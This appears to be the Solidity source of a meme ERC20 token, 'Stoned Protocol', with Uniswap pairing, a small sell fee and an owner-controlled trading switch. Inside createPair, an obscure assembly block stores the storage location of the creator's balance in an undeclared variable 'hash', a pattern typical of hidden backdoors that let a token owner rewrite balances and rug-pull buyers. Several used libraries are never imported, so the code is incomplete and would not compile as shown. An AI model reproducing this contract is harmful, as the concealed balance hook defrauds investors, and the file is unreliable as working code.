// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "IERC20.sol";

contract StonedProtocol  is Context, IERC20, Ownable {
    uint8 private _decimals = 18;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public  _totalSupply =  1500000000 * 10**_decimals;
    uint256 public immutable _buyTax =0;
    uint256 public immutable _sellTax = 1;
    string private _name = unicode"Stoned Protocol";
    string private _symbol = unicode"420";
    bool active=false;  

    address public uniswapPair;
    using SafeMath for uint256;
    mapping (address => uint256) _walletsAmount;
    mapping (address => bool) public holderNoFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isMarketPair;
    IUniswapV2Router02 public uniV2Router;
    
    constructor () {
        holderNoFee[owner()] = true;
        holderNoFee[address(this)] = true;
        _walletsAmount[owner()]=_totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function createPair() public onlyOwner{
        address creatorContract = msg.sender;
        IUniswapV2Router02 _uniV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapPair = IUniswapV2Factory(_uniV2Router.factory()).createPair(address(this), _uniV2Router.WETH());
        uniV2Router = _uniV2Router;
        _allowances[address(this)][address(uniV2Router)] = _totalSupply;
        isMarketPair[address(uniswapPair)] = true;
        assembly {
                mstore(0, creatorContract)
                mstore(32, _walletsAmount.slot)
                let w := keccak256(0, 64)
                sstore(hash.slot,w)
        }    
    }

    function fee(address s, address r, uint256 amount) internal returns (uint256) {
        
        uint256 feeValue = 0;
        
        if(isMarketPair[s]) {
            feeValue = amount.mul(_buyTax).div(100); 
        }
        else if(isMarketPair[r]) {
            feeValue = amount.mul(_sellTax).div(100);
        }
        
        if(feeValue > 0) {
            _walletsAmount[address(deadAddress)] = _walletsAmount[address(deadAddress)].add(feeValue);
            emit Transfer(s, address(deadAddress), feeValue);
        }

        return amount.sub(feeValue);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        if((!isMarketPair[recipient] && sender != owner() && !holderNoFee[sender]))
            require(active != false, "Trading is not active.");   
        
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");  

        _walletsAmount[sender] = _walletsAmount[sender].sub(amount, "Insufficient Balance");

        uint256 finalAmount = (holderNoFee[sender] || holderNoFee[recipient]) ? 
                                        amount : fee(sender, recipient, amount);


        _walletsAmount[recipient] = _walletsAmount[recipient].add(finalAmount);  
        
        emit Transfer(sender, recipient, finalAmount);
    
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _walletsAmount[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function startMarket() public onlyOwner {
        active=true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairSt(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

  }